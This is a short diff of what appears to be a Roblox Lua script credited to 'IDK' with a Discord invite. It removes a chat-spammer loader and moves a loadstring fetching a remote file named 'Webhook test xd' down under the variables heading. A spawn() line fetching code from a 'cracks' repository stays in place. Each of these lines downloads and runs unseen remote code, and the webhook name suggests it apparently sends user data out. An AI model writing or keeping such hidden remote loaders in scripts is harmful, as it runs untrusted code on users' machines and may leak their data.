@@ -1,10 +1,8 @@
 -- by IDK join my discord .gg/V6XdGE5tpE
--- chat spam remove if you want
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/ChatSpammer", true))()
 -- DO NOT REMOVE
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/Webhook%20test%20xd", true))()
 
 -- // Variables \\ --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/Webhook%20test%20xd", true))()
 spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/cute"))()end)
 local Ocean = {}
 
